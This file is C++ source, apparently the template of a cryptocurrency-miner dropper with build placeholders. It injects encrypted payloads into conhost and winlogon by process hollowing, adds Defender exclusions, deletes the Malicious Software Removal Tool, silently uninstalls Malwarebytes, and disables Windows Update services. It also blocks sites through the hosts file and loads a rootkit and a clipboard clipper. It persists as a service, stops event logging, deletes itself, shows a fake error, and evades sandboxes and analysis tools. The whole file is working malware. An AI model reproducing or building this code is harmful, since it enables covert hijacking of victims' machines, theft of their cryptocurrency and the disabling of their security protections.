#include "ntddk.h"

#include "common.h"
#include "obfuscateu.h"
#include "inject.h"

#if DefAntiUsername
#include <algorithm>
#include <vector>
#endif

#if DefAntiUsername || DefFakeError || DefAntiAnalysis
#include <Windows.h>
#endif

#include <thread>

#if DefAntiAnalysis
#include <chrono>
#include <TlHelp32.h>
#endif

void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
    if (!check_mutex(mutex)) {
        size_t out_len;
        unsigned char* payloadDecryped = resource_decrypt(payload, payloadSize, &out_len);
        HANDLE pHandle = process_hollowing(programPath, cmdLine, runtimeData, payloadDecryped, startDir);
        resource_free(payloadDecryped, out_len);
        if (pHandle != INVALID_HANDLE_VALUE) {
#if DefProcessProtect
            if (setCritical) {
                ULONG breakStatus = true;
                UtSetInformationProcess(pHandle, (PROCESSINFOCLASS)0x1d, &breakStatus, AYU_OBFC(sizeof(ULONG)));
            }
#endif
            UtClose(pHandle);
        }
    }
}

wchar_t* formatCommandLine(wchar_t* cmdLine, ...) {
    wchar_t* cmdLineFormatted = new wchar_t[MAX_COMMAND_LENGTH];
    memset(cmdLineFormatted, 0, MAX_COMMAND_LENGTH * sizeof(wchar_t));
    va_list argptr;
    va_start(argptr, cmdLine);
    int len = 0;
    const wchar_t* p = cmdLine;
    while (*p != AYU_OBFC(L'\0') && len < AYU_OBFC(MAX_COMMAND_LENGTH - 1)) {
        if (*p == AYU_OBFC(L'%')) {
            p++;
            if (*p == AYU_OBFC(L'S')) {
                const wchar_t* arg = va_arg(argptr, wchar_t*);
                while (*arg != AYU_OBFC(L'\0') && len < AYU_OBFC(MAX_COMMAND_LENGTH - 1)) {
                    cmdLineFormatted[len++] = *arg++;
                }
            }
        }
        else {
            cmdLineFormatted[len++] = *p;
        }
        if (*p != AYU_OBFC(L'\0')) {
            p++;
        }
    }
    cmdLineFormatted[len] = AYU_OBFC(L'\0');
    va_end(argptr);
    return cmdLineFormatted;
}

#if DefBlockWebsites
void add_to_hosts(char* hostsData, ULONG* hostsSize, char* domain, ULONG domainSize) {
    if (strstr(hostsData, domain) == NULL) {
        strcat(hostsData, AYU_OBFA("\r\n0.0.0.0      "));
        strcat(hostsData, domain);
        *hostsSize += domainSize;
    }
}
#endif

$RESOURCES

#if DefAntiUsername
std::string HashString(std::string input)
{
    HCRYPTPROV hCryptProv;
    HCRYPTHASH hHash;
    BYTE rgbHash[32];
    DWORD cbHash = 32;
    std::string result = "";
    if (!CryptAcquireContext(&hCryptProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return result;
    }
    if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hCryptProv, 0);
        return result;
    }
    std::string inp = input;
    std::transform(inp.begin(), inp.end(), inp.begin(), ::tolower);
    if (!CryptHashData(hHash, (const BYTE*)inp.c_str(), inp.size(), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        return result;
    }
    if (!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        return result;
    }
    for (size_t i = 0; i < cbHash; i++) {
        result += std::to_string((int)rgbHash[i]);
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hCryptProv, 0);
    return result;
}
#endif

#if DefAntiAnalysis
const wchar_t* szProcesses[] = {
    AYU_OBFW(L"ollydbg.exe"),
    AYU_OBFW(L"tcpview.exe"),
    AYU_OBFW(L"autoruns.exe"),
    AYU_OBFW(L"autorunsc.exe"),
    AYU_OBFW(L"filemon.exe"),
    AYU_OBFW(L"procmon.exe"),
    AYU_OBFW(L"regmon.exe"),
    AYU_OBFW(L"procexp.exe"),
    AYU_OBFW(L"idaq.exe"),
    AYU_OBFW(L"idaq64.exe"),
    AYU_OBFW(L"ImmunityDebugger.exe"),
    AYU_OBFW(L"Wireshark.exe"),
    AYU_OBFW(L"dumpcap.exe"),
    AYU_OBFW(L"HookExplorer.exe"),
    AYU_OBFW(L"ImportREC.exe"),
    AYU_OBFW(L"PETools.exe"),
    AYU_OBFW(L"LordPE.exe"),
    AYU_OBFW(L"SysInspector.exe"),
    AYU_OBFW(L"proc_analyzer.exe"),
    AYU_OBFW(L"sysAnalyzer.exe"),
    AYU_OBFW(L"sniff_hit.exe"),
    AYU_OBFW(L"windbg.exe"),
    AYU_OBFW(L"joeboxcontrol.exe"),
    AYU_OBFW(L"joeboxserver.exe"),
    AYU_OBFW(L"joeboxserver.exe"),
    AYU_OBFW(L"x32dbg.exe"),
    AYU_OBFW(L"x64dbg.exe"),
    AYU_OBFW(L"Fiddler.exe"),
    AYU_OBFW(L"httpdebugger.exe"),
    AYU_OBFW(L"frida-helper-32.exe"),
    AYU_OBFW(L"frida-helper-64.exe"),
    };
bool startFinished = false;
DWORD GetProcessIdFromName(const wchar_t* szProcessName) {
    PROCESSENTRY32W pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    if (_wcsicmp(pe32.szExeFile, szProcessName) == 0) {
        CloseHandle(hSnapshot);
        return pe32.th32ProcessID;
    }

    while (Process32NextW(hSnapshot, &pe32)) {
        if (_wcsicmp(pe32.szExeFile, szProcessName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    }

    CloseHandle(hSnapshot);
    return 0;
}
#endif

wchar_t* pebenv;
bool isAdmin;

wchar_t exePath[MAX_PATH] = { 0 };
wchar_t sysdir[MAX_PATH] = { 0 };
wchar_t powershellPath[MAX_PATH] = { 0 };

#if DefStartup
wchar_t startupPath[MAX_PATH] = { 0 };
#endif

OBJECT_ATTRIBUTES attr;

void startMiner()
{
    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYU_OBFW(L"\\cmd.exe"));

    wchar_t conhostPath[MAX_PATH] = { 0 };
    combine_path(conhostPath, sysdir, AYU_OBFW(L"#CONHOSTPATH"));

    wchar_t scPath[MAX_PATH] = { 0 };
    combine_path(scPath, sysdir, AYU_OBFW(L"\\sc.exe"));

#if DefWDExclusions
    run_program(true, sysdir, powershellPath, AYU_OBFW(L"%S #WDCOMMAND"), powershellPath);
    run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c wusa /uninstall /kb:890830 /quiet /norestart"), cmdPath);
    wchar_t msrtPath[MAX_PATH] = { 0 };
    combine_path(msrtPath, sysdir, AYU_OBFW(L"\\MRT.exe"));
    delete_file(msrtPath);

    HANDLE hMSRTKey = NULL;
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\MRT"));
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

    if (!NT_SUCCESS(UtOpenKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr))) {
        UtCreateKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr, 0, NULL, AYU_OBFC(REG_OPTION_NON_VOLATILE), NULL);
    }

    if (hMSRTKey) {
        DWORD disableMSRT = 1;
        UNICODE_STRING uvalue = init_unicode_string(AYU_OBFW(L"DontOfferThroughWUAU"));
        UtSetValueKey(hMSRTKey, &uvalue, 0, AYU_OBFC(REG_DWORD), &disableMSRT, AYU_OBFC(sizeof(DWORD)));
        UtClose(hMSRTKey);
    }
#endif

#if DefUninstallMB
    wchar_t mbunsPath[MAX_PATH] = { 0 };
    wcscat(mbunsPath, AYU_OBFW(L"C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbuns.exe"));
    wchar_t mbunsPath32[MAX_PATH] = { 0 };
    wcscat(mbunsPath32, AYU_OBFW(L"C:\\Program Files (x86)\\Malwarebytes\\Anti-Malware\\mbuns.exe"));
    wchar_t uninsPath[MAX_PATH] = { 0 };
    wcscat(uninsPath, AYU_OBFW(L"C:\\Program Files\\Malwarebytes\\Anti-Malware\\unins000.exe"));
    wchar_t uninsPath32[MAX_PATH] = { 0 };
    wcscat(uninsPath32, AYU_OBFW(L"C:\\Program Files (x86)\\Malwarebytes\\Anti-Malware\\unins000.exe"));
    run_program(false, sysdir, mbunsPath, AYU_OBFW(L"%S /verysilent /suppressmsgboxes /norestart"), mbunsPath);
    run_program(false, sysdir, mbunsPath32, AYU_OBFW(L"%S /verysilent /suppressmsgboxes /norestart"), mbunsPath32);
    run_program(false, sysdir, uninsPath, AYU_OBFW(L"%S /verysilent /suppressmsgboxes /norestart"), uninsPath);
    run_program(false, sysdir, uninsPath32, AYU_OBFW(L"%S /verysilent /suppressmsgboxes /norestart"), uninsPath32);
#endif

#if DefDisableWindowsUpdate
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop UsoSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop WaaSMedicSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop wuauserv"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop bits"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop dosvc"), scPath);
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc"), AYU_OBFW(L"UsoSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"), AYU_OBFW(L"WaaSMedicSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\wuauserv"), AYU_OBFW(L"wuauserv_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BITS"), AYU_OBFW(L"BITS_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\dosvc"), AYU_OBFW(L"dosvc_bkp"));
#endif

#if DefDisableSleep
    wchar_t powercfgPath[MAX_PATH] = { 0 };
    combine_path(powercfgPath, sysdir, AYU_OBFW(L"\\powercfg.exe"));
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-dc 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-dc 0"), powercfgPath);
#endif

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYU_OBFW(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize = 0;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    if (hostsFileSize > 0) {
        PVOID hostsData = NULL;
        SIZE_T allocatedSize = hostsFileSize + AYU_OBFC($DOMAINSIZE);
        if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE)))) {
            strcpy((char*)hostsData, (char*)hostsFile);
            $CPPDOMAINSET
                write_file(hostsPath, hostsData, hostsFileSize);
            UtFreeVirtualMemory(UtCurrentProcess(), &hostsData, &allocatedSize, AYU_OBFC(MEM_RELEASE));
        }
        UtFreeVirtualMemory(UtCurrentProcess(), &hostsFile, &allocatedSize, AYU_OBFC(MEM_RELEASE));
    }
#endif

#if DefRootkit
    inject_process(NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, nullptr, false);
#endif

    bool debugPriv = false;
#if DefProcessProtect
    TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };

    HANDLE hToken = NULL;
    if (NT_SUCCESS(UtOpenProcessToken(UtCurrentProcess(), AYU_OBFC(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))) {
        debugPriv = NT_SUCCESS(UtAdjustPrivilegesToken(hToken, 0, &privilege, AYU_OBFC(sizeof(privilege)), NULL, NULL));
        UtClose(hToken);
    }
#endif

#if DefStartup
    if (isAdmin) {
        if (!install_check(startupPath)) {
            run_program(true, sysdir, scPath, AYU_OBFW(L"%S delete \"#STARTUPENTRYNAME\""), scPath);
            run_program(true, sysdir, scPath, AYU_OBFW(L"%S create \"#STARTUPENTRYNAME\" binpath= \"%S\" start= \"auto\""), scPath, startupPath);
        }
    }
    else {
        wchar_t regPath[MAX_PATH] = { 0 };
        combine_path(regPath, sysdir, AYU_OBFW(L"\\reg.exe"));
        run_program(true, sysdir, regPath, AYU_OBFW(L"%S #STARTUPADDUSER"), regPath, startupPath);
    }

    if (wcsicmp(exePath, startupPath) != 0) {
        ULONG fileSize;
        PVOID exeFile = read_file(exePath, &fileSize);
        write_file(startupPath, exeFile, fileSize);
        SIZE_T memorySize = 0;
        UtFreeVirtualMemory(UtCurrentProcess(), &exeFile, &memorySize, AYU_OBFC(MEM_RELEASE));
#if DefRunInstall
        if (isAdmin) {
            run_program(false, sysdir, scPath, AYU_OBFW(L"%S stop eventlog"), scPath);
            run_program(false, sysdir, scPath, AYU_OBFW(L"%S start \"#STARTUPENTRYNAME\""), scPath);
        }
        else {
            run_program(false, sysdir, startupPath, AYU_OBFW(L"\"%S\""), startupPath);
        }
#endif
#if DefAutoDelete
        run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
#endif
        startFinished = true;
        return;
    }
#endif

#if DefClipper
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\#CLIPPERID"), (BYTE*)resClipper, resClipperSize, conhostPath, conhostPath, sysdir, nullptr, debugPriv);
#endif

    wchar_t winlogonPath[MAX_PATH] = { 0 };
    combine_path(winlogonPath, sysdir, AYU_OBFW(L"#WINLOGONPATH"));

#if DefWatchdog
    wchar_t* formattedCmd = formatCommandLine(AYU_OBFW(L"%S -p \"%S\" -s \"%S\""), AYU_OBFW(L"#COMMANDLINE"), exePath, AYU_OBFW(L"#STARTUPENTRYNAME"));
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\iGFsD9Cx4Q0qctYL"), (BYTE*)resMaster, resMasterSize, winlogonPath, winlogonPath, sysdir, formattedCmd, debugPriv);
    delete[] formattedCmd;
#else
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\iGFsD9Cx4Q0qctYL"), (BYTE*)resMaster, resMasterSize, winlogonPath, winlogonPath, sysdir, AYU_OBFW(L"#COMMANDLINE"), debugPriv);
#endif
#if DefAntiAnalysis
    startFinished = true;
#endif
}

int main(int argc, char *argv[])
{
    UNICODE_STRING umutex = init_unicode_string(AYU_OBFW(L"\\BaseNamedObjects\\#MUTEXMINER"));
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return 0;
    }

    isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
    pebenv = (wchar_t*)peb->ProcessParameters->Environment;

    wcscat(exePath, ((PRTL_USER_PROCESS_PARAMETERS)peb->ProcessParameters)->ImagePathName.Buffer);

    combine_path(sysdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")), AYU_OBFW(L"\\system32"));

    combine_path(powershellPath, sysdir, AYU_OBFW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

#if DefRunAsAdministrator
    if (!isAdmin) {
        run_program(false, sysdir, powershellPath, AYU_OBFW(L"%S Start-Process \"%S\" -Verb runAs"), powershellPath, exePath);
        UtClose(hMutex);
        return 0;
    }
#endif

#if DefFakeError
    MessageBoxW(nullptr, AYU_OBFW(L"#FAKERRORTEXT"), AYU_OBFW(L"#FAKERRORTITLE"), MB_OK | MB_ICONERROR);
#endif

#if DefStartDelay
#if DefStartup
    combine_path(startupPath, get_env(pebenv, isAdmin ? AYU_OBFW(L"PROGRAMDATA=") : AYU_OBFW(L"$BASEDIR")), AYU_OBFW(L"#STARTUPFILE"));
    if (wcsicmp(exePath, startupPath) != 0) {
#endif
        LARGE_INTEGER sleeptime;
        sleeptime.QuadPart = -(AYU_OBFC($STARTDELAY * 10000));
        UtDelayExecution(FALSE, &sleeptime);
#if DefStartup
    }
#endif
#endif

#if DefAntiUsername
    char username[1024 + 1];
    DWORD username_len = 1024 + 1;
    GetUserName(username, &username_len);
    std::string _username = HashString(username);
    std::vector<const char*> usernames = { #USERNAMELIST };
    for (int i = 0; i < usernames.size(); i++)
    {
        if (_stricmp(_username.c_str(), usernames[i]) == 0)
        {
            UtClose(hMutex);
            return 0;
        }
    }
    char computername[1024 + 1];
    DWORD computername_len = 1024 + 1;
    GetComputerName(computername, &computername_len);
    std::string _computername = HashString(computername);
    for (int i = 0; i < usernames.size(); i++)
    {
        if (_stricmp(_computername.c_str(), usernames[i]) == 0)
        {
            UtClose(hMutex);
            return 0;
        }
    }
#endif

#if DefAntiAnalysis
    PULONG ulNumberProcessors = (PULONG)(__readgsqword(0x60) + 0xB8);

    if (*ulNumberProcessors < 2)
    {
        UtClose(hMutex);
        return 0;
    }
#endif

    std::thread startThread(startMiner);

#if DefAntiAnalysis
    while (true)
    {
        if (startFinished)
        {
            startThread.join();
            break;
        }
        for (const auto& process : szProcesses)
        {
            if (GetProcessIdFromName(process))
            {
                break;
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
#else
    startThread.join();
#endif

    UtClose(hMutex);
	return 0;
} 